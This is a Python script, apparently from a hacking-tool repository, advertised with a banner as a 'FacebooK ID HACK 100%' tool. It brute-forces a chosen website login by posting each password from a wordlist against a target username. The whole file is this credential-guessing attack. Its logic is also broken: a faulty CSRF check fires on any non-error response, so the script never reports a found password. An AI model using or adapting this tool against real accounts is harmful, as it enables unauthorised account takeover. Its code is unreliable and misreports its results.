##!/usr/bin/python3
# akashblackhat
print('''\033[91m
 ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄         ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌       ▐░░▌     ▐░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▐░▌ ▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌       ▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌▐░▌  ▐░▌       ▐░▌         ▐░▌        ▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░▌░▌   ▐░█▄▄▄▄▄▄▄█░▌        ▐░▌         ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░▌    ▐░░░░░░░░░░░▌       ▐░▌          ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌    ▀▀▀▀▀▀▀▀▀█░▌      ▐░▌           ▐░▌   ▀   ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌
▐░▌       ▐░▌▐░▌▐░▌            ▐░▌     ▐░▌            ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
▐░▌       ▐░▌▐░▌ ▐░▌           ▐░▌    ▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌
▐░▌       ▐░▌▐░▌  ▐░▌          ▐░▌   ▐░▌              ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░▌ 
 ▀         ▀  ▀    ▀            ▀     ▀                ▀         ▀  ▀         ▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀    V2.0
             [!]  thank you for help me : Mahad  [!]            
⚠️WARNING : I AM NOT RESPONSIBLE FOR THE MISUSE OF THIS TOOL !
                  [😡]FacebooK ID HACK 100%[😡]

   *  Author  : Akash Black Hat
   *  GitHub  : https://github.com/akashblackhat
   *  whatsapp: +91 8389220949
   *  YouTub  : TECHNICAL AKASH SKILLS
   *  FacebooK: https://shorturl.at/MO019
   *  License : MIT         
   *  Gmail   : akashram8090as@gmail.com 
   ''')

z = '''
                       Checking the Server !!

        [+]█████████████████████████████████████████████████[+]
'''

import requests
import time
import sys

url = input("Enter Target Url: ")
username = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try:
    def bruteCracking(username, url, error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: " + str(count) + ' Time For => ' + password)
            data_dict = {"LogInID": username, "Password": password, "Log In": "submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username, url, error)

print("[!!] password not in list")